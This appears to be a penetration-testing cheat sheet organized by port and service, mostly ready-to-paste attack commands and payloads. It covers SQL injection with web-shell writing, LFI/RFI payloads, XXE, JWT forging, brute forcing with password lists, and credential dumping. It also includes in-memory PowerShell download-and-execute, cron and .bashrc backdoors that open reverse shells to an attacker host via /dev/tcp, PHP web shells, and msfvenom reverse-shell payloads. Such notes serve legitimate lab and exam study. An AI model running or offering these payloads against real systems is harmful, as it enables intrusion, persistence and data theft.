# 111 - NFS

## enumeration

```
showmount -e <RHOST>
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <RHOST>
```

## mounting

```
sudo mount -t nfs <RHOST>:<SHARE> /tmp/mount/ -nolock
sudo mount -o nolock <RHOST>:/<SHARE> ./nfs
```

## root-squash

We can change our UUID to match UUID of remote user:

```
adduser pwn
sed -i -e 's/<pwn users uuid>/<remote user uuid>/g' /etc/passwd
```
# 135 - RPC

```text
rpcdump.py <target> -p 135
nmap -n -sV -p 135 --script=msrpc-enum <target>
```

```text
rpcclient [target]
rpcclient -U '' [target]
> enumdomusers
> querydispinfo
> queryuser [rid]
> queryusergroups [rid]
> querygroup
```

```text
use auxiliary/scanner/dcerpc/endpoint_mapper
use auxiliary/scanner/dcerpc/hidden
use auxiliary/scanner/dcerpc/management
use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
```

# 1433 - MsSQL

```text
mssqlclient.py <user>@<target> -windows-auth
SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')
SQL> xp_cmdshell "<command>"
```

# 161 - SNMP

```text
snmpwalk -c <community_string> -v1 -t <target>

# enumerate users
snmpwalk -c <community_string> -v1 <target> 1.3.6.1.4.1.77.1.2.25

# enum processes
snmpwalk -c <community_string> -v1 <target> 1.3.6.1.2.1.25.4.2.1.2

# enum open TCP ports
snmpwalk -c <community_string> -v1 <target> 1.3.6.1.2.1.6.13.1.3

# enum installed software
snmpwalk -c <community_string> -v1 <target> 1.3.6.1.2.1.25.6.3.1.2 
```





# 2049 - NFS

```bash
showmount -e <target>
mount <target>:<remote_folder> <local_folder>
mount -t nfs [-o vers=2] <target>:<remote_folder> <local_folder> -o nolock
umount <local_folder>
```

# 21 - FTP

## bruteforce

```
# default creds
echo 'anonymous' >> ftpdefaults.txt
echo 'ftpuser' >> ftpdefaults.txt
echo 'ftp' >> ftpdefaults.txt
hydra -L ftpdefaults.txt -P ftpdefaults.txt ftp://RHOST

# known username
hydra -l USERNAME -P WORDLIST ftp://RHOST
```

## Default creds

```
anonymous
ftpuser
ftp
```

```
ftp <target>
> <username>
> <password>
> ls -a #don't forget to list hidden files too
> binary
> ascii
> bye
```

## Download all files from FTP

```
wget -m ftp://anonymous:anonymous@<target>
wget -m --no-passive ftp://anonymous:anonymous@<target>
```

# 3306 - MySQL

## recon

```
auxiliary/scanner/mysql/mysql_schemadump
auxiliary/scanner/mysql/mysql_hashdump
```

### Dumping database

```text
mysqlcheck --all-databases -u <username> -p

# get database name

mysqldump <database_name> -u <user> -p
```

### Connecting to database

```text
mysql -u root -p
mysql -h <target> -u root -p
```

```text
show databases;
use <database>;
show tables;
select * from <table>;
describe <table>;
```

```text
https://gist.github.com/bradtraversy/c831baaad44343cc945e76c2e30927b3
https://gist.github.com/hofmannsven/9164408
```

# rdp

## connecting

### remmina

```
yay -S remmina
```

---
description: >-
  an open, vendor-neutral, industry standard application protocol for accessing
  and maintaining distributed directory information services over an Internet
  Protocol (IP) network
---

# 389 - LDAP

```text
nmap -p 389 --script ldap-search <target>
```

```text
enum4linux [-u <user> -p <pass>] <target>
```

```text
https://github.com/ropnop/windapsearch

windapsearch --dc <target> -m users
windapsearch --dc <target> -m users --full
windapsearch --dc <target> -m users --attrs description
```

# 445 - SMB

> Don't use vanilla smbclient and enum4linux

## Listing shares

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <RHOST>
smbmap.py -H <RHOST> -u <user> -p <pass/hash>
crackmapexec smb --shares <RHOST> -u <user> -p <pass>
smbclient -N -L \\\\<RHOST>

smbmap.py -H $1 -u "" -p ""
crackmapexec smb --shares $1 -u "" -p ""
```

## Default shares

```
ADMIN$
C$
IPC$
```

## Connecting to share

```
smbclient.py <target>
  shares
  use <share>
  ls

# mount -t cifs [-o 'username=<user>,password=<pass>'] //<target>/<remote> <local>
```

## Bruteforcing

```
crackmapexec smb <target> -u <user/list> -p <pass/list> --continue-on-success
```

## vanilla smbclient commands

```
SMB> allinfo
SMB> more <file>:<stream>
SMB> recurse on
SMB> prompt off
SMB> mget *
```

## secretsdump

```
secretsdump.py <domain>/<user>@<target>
```

## checking for psexec.py

```
crackmapexec smb <target> -u <user> (-H <hash> || -p <pass>)
```

## psexec.py

```
psexec.py <adminuser>@<target> [-hashes <hash:hash>]
```
# 53 - DNS

## Types of DNS records

```
NS -> nameserver
A -> IPv4 host record
AAAA -> IPv6 host record
MX -> mail exchange
PTR -> pointer record for reverse lookups
CNAME -> to create aliases for host records
TXT -> arbitrary data
```

## Using dig

```
dig DOMAIN
dig +nocmd DOMAIN ns +noall +answer
dig +nocmd DOMAIN axfr +noall +answer @NAMESERVER
```

## Using nslookup

```
nslookup DOMAIN
nslookup -query=ns DOMAIN
nslookup -query=mx DOMAIN
nslookup -query=any DOMAIN
```

or

```
nslookup
> server RHOST
> set q=all
> DOMAIN
> exit
```

## host

```
# reading DNS records
host -t TYPE DOMAIN
for t in a aaaa caa cname mx ns srv txt ptr; do host -t $t DOMAIN; done | grep -v "has no"

# domain transfer (try all DNS servers)
host -l DOMAIN DNSSERVER
for s in $(host -t ns <domain> | cut -d " " -f 4); do host -l <domain> $s; done

for h in $(cat hosts.txt); do host $h.<domain>; done | grep -v "not found"
```

## fierce

```
fierce -dns DOMAIN -dnsserver DNSSERVER
```

## dnsrecon

```
dnsrecon -d <domain> -t axfr
dnsrecon -d <domain> -D <subdomain list> -t brt
```

## dnsenum

```
dnsenum <domain>
```

# 5985 - PowerShell remoting

## Using PowerShell

```powershell
Enter-PSSession -ComputerName COMPUTERNAME -Credential DOMAIN/USERNAME
Enter-PSSession -ComputerName COMPUTERNAME -Credential DOMAIN/USERNAME -ScriptBlock {hostname;whoami,ipconfig}
```
## Using Evil-WinRM

```bash
sudo gem install evil-winrm
evil-winrm -u USERNAME -p PASSWORD -i RHOST
> upload FILENAME
```

## Using WMIExec

```bash
python3 wmiexec.py -hashes NTLMHASH USERNAME@RHOST
```

## Using CrackMapExec

```bash
crackmapexec winrm RHOST -u USERNAME -p PASSWORD
crackmapexec winrm RHOST -u USERNAME -p PASSWORD -X "COMMAND"
```

# 80 - HTTP

```
gobuster dir -u <rhost> -w <wordlist> -t 50 -x php,txt
# also bruteforce extensions (php, txt, ...)
```

`< > ' " { } ;` dangerous special characters to check for

## Default admin controll

```text
/manager/html -> Tomcat
/phpmyadmin -> phpMyAdmin
/cdn-cgi
```

## Default files to check

```text
robots.txt
sitemap.xml

# always check for listable folders
```

## Nobrain tools

```text
nikto -host=http://<rhost>
dirb -r http://<rhost>
```

## PHP wrappers

```text
index.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```

## Files readable by any user for local file inclusion

```text
/etc/passwd
```

```text
c:/windows/win.ini
c:/boot.ini
c:/windows/system32/drivers/etc/hosts
c:\Users\<username>\.ssh\id_rsa
```

## XXE

```text

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY yz SYSTEM 'file:///c:/windows/win.ini'>]>
<order>
    <quantity>3</quantity>
    <item>&yz;</item>
    <address>17th Estate, CA</address>
</order>
```

```text
<?xml version = "1.0"?>
<!DOCTYPE replace [
    <!ENTITY yz SYSTEM "php://filter/convert.base64-encode/resource=db.php">
]>
<order>
    <quantity>5</quantity>
    <item>&yz;</item>
    <address>vffvf</address>
</order>
```

## SQLi

```text
admin' OR 2=2; #
admin' OR 2=2 LIMIT 1; #
index.php?id=1 union all select 1, 2, 3,....
index.php?id=1 union all select 1, 2, @@version
index.php?id=1 union all select 1, 2, table_name from information_achema.tables
index.php?id=1 union all select 1, 2, column_name from information_achema.columns WHERE table_name='users'
index.php?id=1 union all select 1, username, password from users
index.php?id=1 union all select 1, 2, load_file('C:\boot.ini')
index.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'C:\xampp\htdocs\yz.php'
sqlmap -u http://<rhost>/index.php?id=1 -p "id"
sqlmap -u http://<rhost>/index.php?id=1 -p "id" --dbms=mysql --dump
sqlmap -u http://<rhost>/index.php?id=1 -p "id" --dbms=mysql --os-shell
```

```text
sqlmap -u 'http://<rhost>/dashboard.php?search=a' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls" [--os-shell]
```

### Default languages

```text
IIS -> .aspx
Tomcat -> .war
```

---
description: >-
  a computer-network authentication protocol that works on the basis of tickets
  to allow nodes to communicate over a non-secure network
---

# 88 - Kerberos

### Kerberos Pre-Auth

```text
GetNPUsers.py -dc-ip <target> -usersfile <users> -no-pass <domain>/
GetNPUsers.py -dc-ip <target> -no-pass <domain>/<users>

john <hashfile> -format:krb5asrep --wordlist=<wordlist>
hashcat -m 18200 -a 0 '<hash>' <wordlist> --force
```

```text
kerbrute passwordspray -d <domain> --dc <dc> <users> <pass>
```

# Active Directory enumeration

## Downloading our tools

We can download files onto disk using: 
    `certutil.exe` inside cmd,
    `Invoke-WebRequest` (or it's wget/curl alias) inside powershell.

```powershell
certutil.exe -urlcache -f http://RHOST:RPORT/file.ps1 file.ps1
Invoke-WebRequest http://RHOST:RPORT/file.ps1 -OutFile file.ps1
```

We can also load files straight into memory using `iex`.

```powershell
iex (New-Object Net.WebClient).DownloadString("http://RHOST:RPORT/file.ps1")
```

## Enumerating users

```powershell
Get-NetUser
Get-NetUser | Select cn
Get-NetUser | Select -ExpandProperty samaccountname
Find-UserField -SearchField description "pass"
Invoke-EnumerateLocalAdmin
```

## Enumerating groups

```powershell
Get-NetGroup
Get-NetGroup -UserName "USERNAME"
Get-NetGroup -GroupName "GROUPNAME" -FullData
```

## Enumerating computers and shares

```powershell
Get-NetComputer
Get-NetComputer -FullData
Get-NetComputer -OperatingSystem "*windows 10*"
Get-NetComputer -OperatingSystem "*server 2019*"
Invoke-ShareFinder 
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC 
```

## Enumerating misc.

```powershell
Get-NetDomain
Get-NetGPO
Get-ObjectACL
```
[../](../)

# Impacket instalation

## Introduction

So you're likely here if you've had issues with Impacket. Impacket is moderately frustrating to say the least... A lot of people have issues with it, so let's walk through the Impacket install process!

## Installing Impacket

First, you'll want to clone the repo with:

```
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
```

This will clone Impacket to /opt/impacket/, after the repo is cloned, you will notice several install related files, requirements.txt, and setup.py. Setup.py is commonly skipped during the installation. It's key that you DO NOT miss it.

So let's install the requirements:

```
pip3 install -r /opt/impacket/requirements.txt
```

Once all the python modules are installed, we can then run the python setup install script:

```
cd /opt/impacket/ && python3 ./setup.py install
```

After that, Impacket should be correctly installed now and it should be ready to use!

# Kerbrute

## Instalation
Clone the repository.

```
git clone https://github.com/ropnop/kerbrute.git /opt/kerbrute
cd /opt/kerbrute
```

With the repository cloned, you can also use the Make file to compile for common architectures:

```
make help
make all
```

Your new binaries will be inside `dist` directory.

## Usage

Enumerating users:

```
./kerbrute_linux_386 userenum --dc <RHOST> -d <domain> <userlist> 
```

# ASREPRoasting

After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

## Exploitation

Impacket has a tool called "GetNPUsers.py" (located in Impacket/Examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

```
python3 GetNPUsers.py <domain>/ -dc-ip <RHOST> -usersfile <usersfile>
```

Then crack dumped hashes.

```
hashcat -m 18200 <hashfile> <wordlist>
```

# secretsdump.py

For this command to work you will need to also know user's password.

```
secretsdump.py -dc-ip <RHOST> <username>@<RHOST>
```

When successfull, this will dump domain user's NT:LM hashes.
# Authentication bruteforcing

## Medusa

```bash
medusa -h RHOST -M ssh -U PASSWORDS -P USERNAMES
```

## Hydra

```bash
hydra -L USERNAMES -P PASSWORDS SSH://TARGET -T 64
```

## Default credentials

SecLists/Usernames/top-usernames-shortlist.txt
```
root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp
pi
puppet
ansible
ec2-user
vagrant
azureuser
```

SecLists/Passwords/darkweb2017-top100.txt
```
123456
123456789
111111
password
qwerty
abc123
12345678
password1
1234567
123123
1234567890
000000
12345
iloveyou
1q2w3e4r5t
1234
123456a
qwertyuiop
monkey
123321
dragon
654321
666666
123
myspace1
a123456
121212
1qaz2wsx
123qwe
123abc
tinkle
target123
gwerty
1g2w3e4r
gwerty123
zag12wsx
7777777
qwerty1
1q2w3e4r
987654321
222222
qwe123
qwerty123
zxcvbnm
555555
112233
fuckyou
asdfghjkl
12345a
123123123
1q2w3e
qazwsx
computer
aaaaaa
159753
iloveyou1
fuckyou1
princess
789456123
11111111
123654
princess1
888888
linkedin
michael
sunshine
football
11111
777777
1234qwer
999999
j38ifUbn
monkey1
football1
daniel
azerty
a12345
123456789a
789456
asdfgh
love123
abcd1234
jordan23
88888888
5201314
12qwaszx
FQRG7CS493
ashley
asdf
asd123
superman
jessica
love
samsung
shadow
blink182
333333
michael1
babygirl1
```
# chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

## Local Port Forward

Proxy host:
```
./chisel server -p LPORT
```

Attacker host:
```
./chisel client RHOST:RPORT LPORT:RHOST:RPORT
```

## Remote Port Forward

Attacker host:
```
./chisel server -p LPORT --reverse &
```

Proxy host:
```
./chisel client RHOST:RHOST R:LPORT:RHOST:RHOST &
```

## Reverse SOCKS Proxy

On attacker host:
```
./chisel server -p LPORT --reverse &
```

On proxy host:
```
./chisel client RHOST:RPORT R:socks &
```

Then use proxychains.

## Forward SOCKS Proxy

On proxy host:
```
./chisel server -p LPORT --socks5
```

On attacker host:
```
./chisel client RHOST:RPORT LPORT:socks
```

Then use proxychains.
# Client side attacks

## Basic windows executable

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST= LPORT=8990 -e x86/shikata_ga_nai -f exe -o out.exe
```

## .hta phishing

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f hta-psh -o document.hta
```

```vbscript
<script language="VBScript">
  Function Update()
    Dim yz
    Set yz = CreateObject("Wscript.Shell")
    yz.run "PAYLOAD"
    Set yz = Nothing
  End Function
  
  Update
  self.close
</script>
```
## Identifying hashes

```
https://hashcat.net/wiki/doku.php?id=example_hashes
https://hashid.zulln.se/
hashid <hash>
```

## john rules

```
john <HASHFILE> -wordlist=<WORLDIST> --rules:All
```

## Cracking non-salted hashes online

```
https://crackstation.net/
https://www.hashes.org/search.php
https://hashes.com/en/decrypt/hash
```

## Cracking password of id\_rsa

```
/usr/share/john/ssh2john.py id_rsa > id_rsa.hashes
john -w /usr/share/wordlists/rockyou.txt --format=SSH id_rsa.hashes
```

## Cracking passwd/shadow

```text
# unshadow
/usr/sbin/unshadow passwd shadow >> crack.me

# crack with john
john -wordlist=/usr/share/wordlists/rockyou.txt crack.me

# or with hashcat
hashcat -m 500 -a 0 crack.me /usr/share/wordlists/rockyou.txt -O
```

## Cracking windows hashes

```
use post/windows/gather/credentials/credential_collector
```

## Cracking .zip/.rar files

```
zip2john test.zip > zip.hashes
rar2john test.rar > rar.hashes

john zip.hashes
john rar.hashes
```

```
fcrackzip -v -u -D -p wordlist.txt file.zip
```

# Custom wordlist generation

## Generating usernames from names

```python
import sys

if len(sys.argv) != 2:
    print("Usage: {} NAMEFILE".format(sys.argv[0]))
    sys.exit(0)

for line in open(sys.argv[1]):
    full_name = line.replace("\n", "")
    tokens = full_name.split(" ")
    fst = tokens[0]
    lst = tokens[-1]

    print(fst)
    print(lst)
    print(fst[0] + lst)
    print(fst[0] + "." + lst)
    print(fst + lst)
    print(fst + "." + lst)
    print(lst + fst[0])
    print(lst + "." + fst[0])
    print(lst + fst)
    print(lst + "." + fst)

```

## Generating passwords from text

Cewl will generate wordlist from contents of a webpage.

```
cewl <url> >> wordlist.txt
```

or this custom python script

```python
import re

with open("index.html", "r") as f:
    wordlist = set()
    for line in f.readlines():
        line = re.sub('[^0-9a-zA-Z]+', ' ', line)
        for l in line.split(" "):
            wordlist.add("admin:"+l)
    for word in wordlist:
        print(word)
```
# Encryption

### Symmetric GPG encryption

```text
# encryption
gpg -c data.txt

# decryption
gpg -d data.txt.gpg
```

### Asymmetric encryption

```text
# generate private key
openssl genrsa -aes256 -out private.key 8912

# to generate public key we need private key
openssl rsa -in private.key -pubout -out public.key

# encrypting file with public key
openssl rsautl -encrypt -pubin -inkey public.key -in plaintext.txt -out encrypted.txt

# decrypting file with private key
openssl rsautl -decrypt -inkey private.key -in encrypted.txt -out plaintext.txt
```

# Evil-WinRM

> 'Administrators' and 'Remote Management Users' grous are required

```
sudo gem install evil-winrm
evil-winrm -u USER -p PASS -i RHOST -P RPORT 
```
# basics of file inclusion

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

php web shell

```
<?php system($_GET['yz']); ?>
%3C%3Fphp%20system%28%24%5FGET%5B%22yz%22%5D%29%3B%3F%3E

echo '<pre><?php system($_GET["yz"]);?></pre>' > shell.php
%0Aecho%20%27%3Cpre%3E%3C%3Fphp%20system%28%24%5FGET%5B%22yz%22%5D%29%3B%3F%3E%3C%2Fpre%3E%27%20%3E%20shell%2Ephp
```

world readable files

```
/etc/passwd
C:\Windows\boot.ini
```

copy/paste these

```
../../../../../../../../etc/passwd
/../../../../../../../../etc/passwd
....//....//....//....//....//....//....//....//etc/passwd
/....//....//....//....//....//....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd
%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd

php://filter/read=/resource=../../../../../../../../etc/passwd
php://filter/read=convert.base64-encode/resource=../../../../../../../../etc/passwd
php://filter/read=string.rot13/resource=../../../../../../../../etc/passwd

expect://id
```

more advanced copy/paste

```
echo '<?php system($_GET['yz']); ?>' | base64
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW3l6XSk7ID8+Cg==&yz=id

curl -s -X POST --data "<?php system('id'); ?>" "http://<TARGET>/index.php?language=php://input"

echo '<?php system($_GET['yz']); ?>' > yz.php
zip yz.zip yz.php
# upload
zip://yz.zip%23yz.php&yz=id
```

PHP versions before 5.5 are vulnerable to null byte injection to bypass file extensions

```
language=../../../../../../../../etc/passwd%00
```


# RCE through poisoning log files

```
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/sshd.log
/var/log/mail
/var/log/vsftpd.log
/proc/self/environ # on older servers

<?php system($_GET['cmd']); ?> # use as an user-agent
```

```
/etc/ssh/sshd_config
```

# RCE through php session files

```
/var/lib/php/sessions/sess_<PHPSESSID>
C:\Windows\Temp\sess_<PHPSESSID>
```

```
index.php?language=<?php system($_GET['cmd']); ?>
index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id
```

# remote file inclusion

```
index.php?language=http://<LHOST>/yz.php&yz=id
index.php?language=ftp://<USER>:<PASS>@<LHOST>/yz.php&yz=id
```

# patching/hardening

```php
$lfi = "....././/..../..//filename";
while( substr_count($lfi, '../', 0)) {
 $lfi = str_replace('../', '', $lfi);
};
```

```php
basename($_GET['language'])
```

```
# php.ini
open_basedir = /var/www
display_errors = Off
allow_url_fopen = Off
allow_url_include = Off
disable_functions = system, passthru, shell_exec, popen, proc_open, curl_exec, curl_multi_exec, parse_ini_file, show_source
```
# file transfers

## Windows

### powershell download

```
(New-Object System.Net.WebClient).DownloadFile('https://<LHOST>/PowerView.ps1',".\PowerView.ps1")
Invoke-WebRequest https://<LHOST>/PowerView.ps1 -OutFile PowerView.ps1
```

### powershell in memory execution

```
IEX (New-Object Net.WebClient).DownloadString('https://<LHOST>/Invoke-Mimikatz.ps1')
Invoke-WebRequest https://<LHOST>/Invoke-Mimikatz.ps1 | iex
```

### if powershell first launch configuration has not been completed 

use `-UseBasicParsing`

```
Invoke-WebRequest https://<LHOST>/PowerView.ps1 -UseBasicParsing | iex
```

or disable first run customization

```
reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /f /v DisableFirstRunCustomize /t REG_DWORD /d 2
```

### powershell uploads

catch with netcat

```
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/<FILE>' -Encoding Byte))
Invoke-WebRequest -Uri http://<LHOST>:<LPORT> -Method POST -Body $b64
```

### bitsadmin

```
bitsadmin /transfer n http://<LHOST>/nc.exe C:\Temp\nc.exe
```

powershell download or upload using bitsadmin

```
Import-Module bitstransfer;Start-BitsTransfer -Source "http://<LHOST>/nc.exe" -Destination "C:\Temp\nc.exe"
Start-BitsTransfer "C:\<FILE>" -Destination "http://<RHOST>/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
```

### certutil

```
certutil.exe -verifyctl -split -f http://<LHOST>/nc.exe
```

## Netcat

```
# source
nc -nv <ip> <port> < <file>

# destination
nc -lvnp <port> > <file>
```

## Powercat

```
# source
powercat -c <ip> -p <port> -i C:\<src_path>

# destination
powercat -l -p <port> -of C:\<dst_path>
```

## Socat

```
# source
socat TCP4-LISTEN:<port>,fork file:<src_path>

# destination
socat TCP4:<ip>:<port> file:<dst_path>,create
```

## HTTP server + Powershell

```
# create server on attacker machine with one of these
python3 -m http.server <port>
python2 -m SimpleHTTPServer <port>
php -S 0.0.0.0:<port>
ruby -run -e httpd . -p <port>
busybox -f -p <port>

# download with powershell oneliner
## download file
(New-Object System.Net.WebClient).DownloadString("<source>","<destination>")

## execute powershell script without touching disk
iex (New-Object System.Net.WebClient).DownloadString("<source>")

## upload file
iex (New-Object System.Net.WebClient).UploadFile("<destination>", "<file>")
```

## pure-ftp

```
# ftp server needs to be configured before

echo open <attacker> 21 > ftp.txt
echo user <user> >> ftp.txt
echo <pass> >> ftp.txt
echo bin >> ftp.txt
echo get <file> >> ftp.txt
echo bye >> ftp.txt

ftp -v -n -s:ftp.txt
```

## exe2hex

```
upc -9 <file>
exe2hex -x <file> -p <output>.cmd
# copy paste into target terminal
```

## If everything fails, base64

# Firewall/IDS evasion

## Fragmentation

Fragmenting of packets can be turned on using `-f` option in nmap.

Fragmentations doesn't work with every type of scan, for example `-sT` or `-sV`.

Instead of using `-f`, we can use `--mtu` for custom offset size (must be a multiple of 8). 

## Decoys

Evasion using decoys works by sending packets from spoofed IP's (it's best if spoofed IP's are from real machines).

Decoys can be turned on using `-D` option.

```bash
nmap -sS -D DECOY1,DECOY2,DECOY3,ME RHOST
```

Without specifying `ME`, nmap will send scans with your IP in a random position.

You cannot use `-sT` and `-sV` scans with decoy mode enabled.

## Timing

Only slows down scanning, doesn't alter packets in any way.

Use `-T` option to specify timing

|Option|Delay|
|---|---|
|-T0|5 min|
|-T1|15 sec|
|-T2|0,4 sec|
|-T3|default|
|-T4|10 millisec|
|-T5|5 millisec|

## Source ports

Changing source port to 53, 80 or 443 can also help

Use `--source-port` or `-g` option

```bash
nmap -sS --source-port 53 RHOST
```
# gobuster

```
gobuster dir -t 64 -w /usr/share/wordlists/directory-list-2.3-medium.txt -u <URL>
```

# ffuf

```
fuzzing
ffuf -w <WORDLIST>:FUZZ -u http://<RHOST>:<RPORT>/FUZZ

extension fuzzing
ffuf -w <WORDLIST>:FUZZ -u http://<RHOST>:<RPORT>/indexFUZZ

recursive fuzzing
ffuf -w <WORDLIST>:FUZZ -u http://<RHOST>:<RPORT>/FUZZ -recursion -recursion-depth 2 -e '.php,.php7' -v

subdomain fuzzing
ffuf -w <WORDLIST>:FUZZ -u https://FUZZ.<DOMAIN>/

vhost fuzzing
ffuf -w <WORDLIST>:FUZZ -u http://<RHOST>:<RPORT>/ -H 'Host: FUZZ.<DOMAIN>' -fs <FILTERSIZE>

parameter fuzzing - GET
ffuf -w <WORDLIST>:FUZZ -u http://<RHOST>:<RPORT>/admin/admin.php?FUZZ=key -fs <FILTERSIZE>	

parameter fuzzing - POST
ffuf -w <WORDLIST>:FUZZ -u http://<RHOST>:<RPORT>/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs <FILTERSIZE>
```

Wordlists
```
SecLists/Discovery/Web-Content/directory-list-2.3-small.txt	
SecLists/Discovery/Web-Content/web-extensions.txt	
SecLists/Discovery/DNS/subdomains-top1million-5000.txt	
SecLists/Discovery/Web-Content/burp-parameter-names.txt	
```
# JWT token attacks

### Forging own JWT tokens

[jwt.io](https://jwt.io/)

pyjwt - python library for JWT

```python
import jwt
import time

epoch = int(time.time())
jwt_token = jwt.encode({"username":"admin", "created":epoch}, key="SECRETKEY", algorithm="HS256")
jwt_token = jwt_token.decode("UTF-8")

print(jwt_token)
```

### No signature check

Sometimes server does not check token signature. In that case, we can change token data and send modified token

```python
import jwt
import time

epoch = int(time.time())
jwt_token = jwt.encode({"username":"admin", "created":"0"}, key=None, algorithm=None)
jwt_token = jwt_token.decode("UTF-8")

print(jwt_token)
```

### Cracking JWT tokens

```
hashcat -m 16500 JWT_FILE WORDLIST
hashcat -m 16500 JWT_FILE --show
```
## vulnerable program

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bowfunc(char *string) {

	char buffer[1024];
	strcpy(buffer, string);
	return 1;
}

int main(int argc, char *argv[]) {

	bowfunc(argv[1]);
	printf("Done.\n");
	return 1;
}
```

disable ASLR

```bash
sudo su
echo 0 > /proc/sys/kernel/randomize_va_space
```

compile
```bash
# 32-bit
gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32
file bow32 | tr "," "\n"

# 64-bit
gcc bow.c -o bow64 -fno-stack-protector -z execstack -m64
file bow64 | tr "," "\n"
```

## gdb

```bash
echo 'set disassembly-flavor intel' > ~/.gdbinit
```

```
disas FUNCTION
run $(python -c "print 'i' * 1200") # /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
info registers
```
# Linux persistence/backdoors

## SSH backdoor

Generate new keypair.

```bash
sshkeygen
```

Add your public key to `authorized_keys` on target machine.

```bash
chmod 600 id_rsa
ssh -i id_rsa USER@RHOST
```

## PHP backdoors

Webroot usual location: `/var/www/html`

```php
<?php
    if (isset($_REQUEST['yz'])) {
        echo "<pre>" . shell_exec($_REQUEST['yz']) . "</pre>";
    }
?>
<form action="" method="get">
<input type="text" id="yz" name="yz">
<input type="submit" value="Submit">
</form> 
```

## Cron jobs

Cron jobs are located in: `/etc/cronjob`

```
* *     * * *   root    curl http://RHOST/shell.php | bash
```

```bash
#!/bin/bash

bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

## bashrc backdoor

Waiting for user to login.

```bash
echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
```

## More...

[airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c)
# Spawning root shell

## Rootbash

In this method we create a copy of bash binary with root privileges and set SUID bit on, resulting in bash executable which when executed always run with a context of root user.

```text
cp /bin/bash /tmp/yzbash; chmod +s /tmp/yzbash
```

After creating a copy, we can run it in unprivileged terminal.

```text
/tmp/rootbash -p
```

## Executable

We create a simple C program which sets UID to 0 and runs `/bin/bash` . When compiled with root privileges, we can run it afterwards for permanent root backdoor.

```text
int main(){
    setuid(0);
    system("/bin/bash");
}
```

Compile it with root privileges.

```text
gcc -o <out_file> <source_code>
```

## Msfvenom executable

Create msfvenom reverse shell, then execute as a root with handler prepared on your attack machine.

```text
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf > shell
```

## Native reverse shells

This method needs more research.

```text
https://github.com/mthbernardes/rsg
```
# Manual enumeration

## System enumeration

```text
hostname

# enumerate os version
uname -a
cat /etc/issue
cat /proc/version
cat /etc/*-release

# enumerate number of cores
lscpu

# enumerate running services
ps aux

# enumerate installed packages
dpkg -l
```

## User enumeration

```text
# whoami
whoami
id

# what can I run as an admin
sudo -l

# enumerate users
cat /etc/passwd
cat /etc/passwd | cut -d : -f 1
cat /etc/passwd | grep "sh$"

# enumerate groups
cat /etc/group
```

## Network enumeration

```text
# enumerate network interfaces
ip a
ifconfig

# enumerate routing table
ip route
routel

#enumerate arp table
ip neigh
arp -a

# enumerate open ports and connected clients
netstat -ano
netstat -anp
ss -anp
cat /etc/iptables
```

## Hunting for interesting files

```text
# enumerate by file contents
grep --color=auto -rnw '/' -ie "password" --color=always >/dev/null
grep --color=auto -rnw '/' -ie "pass" --color=always >/dev/null
grep --color=auto -rnw '/' -ie "pwd" --color=always >/dev/null

# enumerate by file name
locate password | more
locate pass | more
locate pwd | more

# search for ssh keys
find / -name id_rsa 2>/dev/null
```

# Automated tools

### [https://github.com/rebootuser/LinEnum \(linenum.sh\)](https://github.com/rebootuser/LinEnum)

